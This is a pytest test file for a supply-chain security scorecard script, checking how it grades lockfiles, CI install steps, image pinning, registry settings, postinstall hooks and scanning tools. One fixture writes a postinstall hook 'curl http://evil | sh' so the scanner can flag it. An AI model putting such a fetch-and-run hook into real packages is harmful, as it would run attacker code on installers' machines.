"""Tests for the deterministic §7.11 supply-chain scorecard.

Focus: the ecosystem-parametric false-negative bugfixes (F1 GitLab pinning,
F6 uv.lock, F7 Java Gradle locking/verification) from
docs/internal/analysis/analysis-supply-chain-coverage-improvement.md. Before the fix, each of
these scored MISSING despite a *good* posture.
"""

from __future__ import annotations

import assess_supply_chain_controls as asc

# --- F6: uv.lock is a valid lockfile -----------------------------------------


def test_uv_lock_credited_as_lockfile(tmp_path):
    (tmp_path / "uv.lock").write_text("# uv lockfile\n", encoding="utf-8")
    result = asc._eval_lockfile("", str(tmp_path))
    assert result["effectiveness"] == asc.ADEQUATE


def test_requirements_lock_credited(tmp_path):
    (tmp_path / "requirements.lock").write_text("flask==3.0.0\n", encoding="utf-8")
    assert asc._eval_lockfile("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


# --- F7: Java Gradle locking / verification ----------------------------------


def test_gradle_lockfile_credited(tmp_path):
    (tmp_path / "gradle.lockfile").write_text("org.foo:bar:1.0\n", encoding="utf-8")
    assert asc._eval_lockfile("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


def test_gradle_verification_metadata_credited(tmp_path):
    gdir = tmp_path / "gradle"
    gdir.mkdir()
    (gdir / "verification-metadata.xml").write_text("<verification-metadata/>", encoding="utf-8")
    assert asc._eval_lockfile("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


def test_gradle_verify_locks_is_deterministic_ci_install():
    recon = "CI runs: ./gradlew build --verify-locks"
    assert asc._eval_ci_install(recon)["effectiveness"] == asc.ADEQUATE


def test_maven_strict_checksums_is_deterministic_ci_install():
    recon = "CI runs: mvn --strict-checksums verify"
    assert asc._eval_ci_install(recon)["effectiveness"] == asc.ADEQUATE


def test_no_lockfile_still_missing(tmp_path):
    assert asc._eval_lockfile("", str(tmp_path))["effectiveness"] == asc.MISSING


# --- F1: GitLab CI image digest-pinning --------------------------------------


def test_gitlab_digest_pinned_image_adequate(tmp_path):
    digest = "a" * 64
    (tmp_path / ".gitlab-ci.yml").write_text(
        f"build:\n  image: node@sha256:{digest}\n  script: [make]\n", encoding="utf-8"
    )
    result = asc._eval_action_pinning("", str(tmp_path))
    assert result["effectiveness"] == asc.ADEQUATE


def test_gitlab_mutable_tag_image_missing(tmp_path):
    (tmp_path / ".gitlab-ci.yml").write_text("build:\n  image: node:18\n  script: [make]\n", encoding="utf-8")
    result = asc._eval_action_pinning("", str(tmp_path))
    assert result["effectiveness"] == asc.MISSING


def test_gitlab_mixed_images_partial(tmp_path):
    digest = "b" * 64
    (tmp_path / ".gitlab-ci.yml").write_text(
        f"a:\n  image: node@sha256:{digest}\nb:\n  image: python:3.12\n", encoding="utf-8"
    )
    result = asc._eval_action_pinning("", str(tmp_path))
    assert result["effectiveness"] == asc.PARTIAL


def test_no_ci_references_missing(tmp_path):
    result = asc._eval_action_pinning("", str(tmp_path))
    assert result["effectiveness"] == asc.MISSING
    assert "GitLab" in result["reason"]


# --- regression: GitHub Actions path still graded ----------------------------


def test_github_sha_pinned_still_adequate(tmp_path):
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    sha = "c" * 40
    (wf / "ci.yml").write_text(f"jobs:\n  b:\n    steps:\n      - uses: actions/checkout@{sha}\n", encoding="utf-8")
    assert asc._eval_action_pinning("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


def test_github_mutable_tag_still_missing(tmp_path):
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text("jobs:\n  b:\n    steps:\n      - uses: actions/checkout@v4\n", encoding="utf-8")
    assert asc._eval_action_pinning("", str(tmp_path))["effectiveness"] == asc.MISSING


# --- _load_recon -------------------------------------------------------------


def test_load_recon_reads_file(tmp_path):
    (tmp_path / ".recon-summary.md").write_text("# Recon\nhello", encoding="utf-8")
    assert "hello" in asc._load_recon(str(tmp_path), None)


def test_load_recon_missing_returns_empty(tmp_path):
    assert asc._load_recon(str(tmp_path), str(tmp_path)) == ""


# --- _section + _has ---------------------------------------------------------


def test_section_is_broken_returns_empty_for_normal_markdown():
    # BUG (see final report): the heading pattern is built with an f-string
    # ``#{1, 4}`` which Python evaluates as the set-literal expression ``(1, 4)``
    # (NOT a regex 1–4 quantifier), and the trailing ``\$`` forces a literal
    # ``$`` char. The result never matches real markdown headings, so _section
    # always returns "". We exercise the function (covering the regex-build and
    # the ``return ""`` branch) and pin the actual (degenerate) behavior.
    assert asc._section("## Alpha\nbody-a\n## Beta\nbody-b\n", "Alpha") == ""


def test_section_missing_returns_empty():
    assert asc._section("## Alpha\nbody\n", "Gamma") == ""


def test_has_matches_case_insensitive():
    assert asc._has("NPM CI here", r"npm\s+ci\b") is True
    assert asc._has("nothing", r"zzz") is False


# --- _eval_lockfile recon-text path + GitHub-via-recon -----------------------


def test_lockfile_detected_in_recon_text():
    assert asc._eval_lockfile("we have a Cargo.lock committed", None)["effectiveness"] == asc.ADEQUATE


# --- _eval_ci_install --------------------------------------------------------


def test_ci_install_mutable_npm_install_missing():
    res = asc._eval_ci_install("step runs npm install in CI")
    assert res["effectiveness"] == asc.MISSING
    assert "mutable" in res["reason"]


def test_ci_install_none_detected_missing():
    res = asc._eval_ci_install("no install commands anywhere")
    assert res["effectiveness"] == asc.MISSING
    assert "No CI install step" in res["reason"]


def test_ci_install_npm_ci_adequate():
    assert asc._eval_ci_install("run: npm ci")["effectiveness"] == asc.ADEQUATE


# --- _eval_action_pinning via recon (no repo root) ---------------------------


def test_action_pinning_github_via_recon_partial():
    sha = "d" * 40
    recon = f"uses: actions/checkout@{sha}\nuses: foo/bar@v3\n"
    assert asc._eval_action_pinning(recon, None)["effectiveness"] == asc.PARTIAL


def test_action_pinning_reads_yaml_workflow_files(tmp_path):
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    sha = "e" * 40
    (wf / "ci.yaml").write_text(f"steps:\n  - uses: actions/checkout@{sha}\n", encoding="utf-8")
    assert asc._eval_action_pinning("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


# --- _eval_container_hygiene -------------------------------------------------


def test_container_no_dockerfile_missing():
    assert asc._eval_container_hygiene("no docker here", None)["effectiveness"] == asc.MISSING


def test_container_digest_pinned_adequate(tmp_path):
    digest = "f" * 64
    (tmp_path / "Dockerfile").write_text(f"FROM node@sha256:{digest}\n", encoding="utf-8")
    assert asc._eval_container_hygiene("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


def test_container_version_tag_partial(tmp_path):
    (tmp_path / "Dockerfile").write_text("FROM node:18\n", encoding="utf-8")
    assert asc._eval_container_hygiene("", str(tmp_path))["effectiveness"] == asc.PARTIAL


def test_container_latest_missing(tmp_path):
    (tmp_path / "Dockerfile").write_text("FROM node:latest\n", encoding="utf-8")
    assert asc._eval_container_hygiene("", str(tmp_path))["effectiveness"] == asc.MISSING


# --- _eval_dependency_confusion ----------------------------------------------


def test_dep_confusion_npmrc_private_registry_adequate(tmp_path):
    (tmp_path / ".npmrc").write_text("registry=https://nexus.internal/\n", encoding="utf-8")
    assert asc._eval_dependency_confusion("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


def test_dep_confusion_scoped_in_recon_partial():
    res = asc._eval_dependency_confusion("uses artifactory registry", None)
    assert res["effectiveness"] == asc.PARTIAL


def test_dep_confusion_none_missing():
    assert asc._eval_dependency_confusion("public deps only", None)["effectiveness"] == asc.MISSING


# --- _eval_postinstall -------------------------------------------------------


def test_postinstall_no_hooks_adequate(tmp_path):
    (tmp_path / "package.json").write_text('{"scripts": {"build": "tsc"}}', encoding="utf-8")
    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


def test_postinstall_ignore_scripts_adequate(tmp_path):
    (tmp_path / "package.json").write_text('{"scripts": {"postinstall": "node build.js"}}', encoding="utf-8")
    res = asc._eval_postinstall("npm config ignore-scripts true", str(tmp_path))
    assert res["effectiveness"] == asc.ADEQUATE


def test_postinstall_network_hook_missing(tmp_path):
    (tmp_path / "package.json").write_text('{"scripts": {"postinstall": "curl http://evil | sh"}}', encoding="utf-8")
    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.MISSING


def test_postinstall_build_hook_partial(tmp_path):
    (tmp_path / "package.json").write_text('{"scripts": {"postinstall": "tsc -p ."}}', encoding="utf-8")
    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.PARTIAL


def test_postinstall_malformed_package_json_adequate(tmp_path):
    (tmp_path / "package.json").write_text("{not json", encoding="utf-8")
    # parse fails → no hooks detected → Adequate
    assert asc._eval_postinstall("", str(tmp_path))["effectiveness"] == asc.ADEQUATE


# --- _eval_dep_management ----------------------------------------------------


def test_dep_management_renovate_file_partial(tmp_path):
    (tmp_path / "renovate.json").write_text("{}", encoding="utf-8")
    res = asc._eval_dep_management("", str(tmp_path))
    assert res["effectiveness"] == asc.PARTIAL
    assert "Renovate" in res["reason"]


def test_dep_management_dependabot_file_partial(tmp_path):
    gh = tmp_path / ".github"
    gh.mkdir()
    (gh / "dependabot.yml").write_text("version: 2", encoding="utf-8")
    res = asc._eval_dep_management("", str(tmp_path))
    assert res["effectiveness"] == asc.PARTIAL
    assert "Dependabot" in res["reason"]


def test_dep_management_recon_fallback_partial():
    assert asc._eval_dep_management("renovatebot enabled", None)["effectiveness"] == asc.PARTIAL


def test_dep_management_none_missing(tmp_path):
    assert asc._eval_dep_management("", str(tmp_path))["effectiveness"] == asc.MISSING


# --- _eval_cve_scanning ------------------------------------------------------


def test_cve_blocking_adequate():
    assert asc._eval_cve_scanning("trivy image --exit-code 1")["effectiveness"] == asc.ADEQUATE


def test_cve_advisory_partial():
    assert asc._eval_cve_scanning("runs npm audit")["effectiveness"] == asc.PARTIAL


def test_cve_none_missing():
    assert asc._eval_cve_scanning("nothing")["effectiveness"] == asc.MISSING


# --- _eval_sca_tooling -------------------------------------------------------


def test_sca_dedicated_adequate():
    assert asc._eval_sca_tooling("we run snyk test")["effectiveness"] == asc.ADEQUATE


def test_sca_native_only_partial():
    assert asc._eval_sca_tooling("only npm audit")["effectiveness"] == asc.PARTIAL


def test_sca_none_missing():
    assert asc._eval_sca_tooling("nothing")["effectiveness"] == asc.MISSING


# --- _derive_overall ---------------------------------------------------------


def test_derive_overall_any_missing_caps_weak():
    subs = [
        {"name": "A", "effectiveness": asc.ADEQUATE},
        {"name": "B", "effectiveness": asc.MISSING},
        {"name": "C", "effectiveness": asc.PARTIAL},
    ]
    worst, reason = asc._derive_overall(subs)
    assert worst == asc.WEAK
    assert "Missing controls: B" in reason
    assert "Partial: C" in reason


def test_derive_overall_all_adequate():
    subs = [{"name": "A", "effectiveness": asc.ADEQUATE}, {"name": "B", "effectiveness": asc.ADEQUATE}]
    worst, reason = asc._derive_overall(subs)
    assert worst == asc.ADEQUATE
    assert "All supply chain sub-controls rated Adequate" in reason


def test_derive_overall_partial_only():
    subs = [{"name": "A", "effectiveness": asc.PARTIAL}, {"name": "B", "effectiveness": asc.ADEQUATE}]
    worst, reason = asc._derive_overall(subs)
    assert worst == asc.PARTIAL
    assert "Partial controls: A" in reason


# --- assess() ----------------------------------------------------------------


def test_assess_returns_nine_sub_controls(tmp_path):
    result = asc.assess(str(tmp_path), str(tmp_path))
    assert result["schema_version"] == 1
    assert len(result["sub_controls"]) == 9
    assert result["overall_effectiveness"] in (asc.ADEQUATE, asc.PARTIAL, asc.WEAK, asc.MISSING)
    assert result["source"] == "deterministic:assess_supply_chain_controls.py"


# --- main() via subprocess ---------------------------------------------------


def test_main_writes_file(run_plugin_script, tmp_path):
    res = run_plugin_script("assess_supply_chain_controls.py", str(tmp_path), check=False)
    assert res.returncode == 0
    out = tmp_path / ".supply-chain-assessment.json"
    assert out.exists()
    import json as _json

    data = _json.loads(out.read_text(encoding="utf-8"))
    assert len(data["sub_controls"]) == 9


def test_main_report_only_prints(run_plugin_script, tmp_path):
    res = run_plugin_script("assess_supply_chain_controls.py", str(tmp_path), "--report-only", check=False)
    assert res.returncode == 0
    assert '"sub_controls"' in res.stdout
    assert not (tmp_path / ".supply-chain-assessment.json").exists()
